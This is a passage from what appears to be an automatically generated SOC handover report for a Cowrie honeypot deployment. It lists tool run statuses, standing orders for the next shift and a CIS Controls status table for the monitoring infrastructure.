| Tool 30b | ASN Clustering              | ✅ 96 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 24 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 180 priority case(s) shown individually · 58 recon entry/entries in table (19 group(s) consolidating 194 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-05T17:45:15Z_
